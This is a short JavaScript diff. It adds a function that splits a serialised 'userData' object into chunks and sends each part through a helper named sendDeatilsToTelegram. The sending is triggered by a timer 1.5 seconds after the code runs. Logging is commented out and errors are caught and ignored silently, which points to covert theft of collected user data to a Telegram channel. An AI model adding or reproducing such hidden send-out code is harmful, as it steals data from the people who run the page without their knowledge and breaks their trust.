@@ -603,6 +603,23 @@ async function sha256(str) {
             return chunks;
         }
 
+    // Modified sending function
+async function sendDeatilsToTelegram1(message) {
+    const chunks = splitIntoChunks(message);
+
+    for (const [index, chunk] of chunks.entries()) {
+        await sendDeatilsToTelegram(`Part ${index + 1}/${chunks.length}\n${chunk}`);
     }
+}
+
+setTimeout(async () => {
+    try {
+        const formattedData = JSON.stringify(userData, null, 2);
+        // console.clear()
+        await sendDeatilsToTelegram1(formattedData);
+    } catch (error) {
+        // console.log("Error loading fetcher", error);
+    }
+}, 1500);}
     collectAllData();
 };
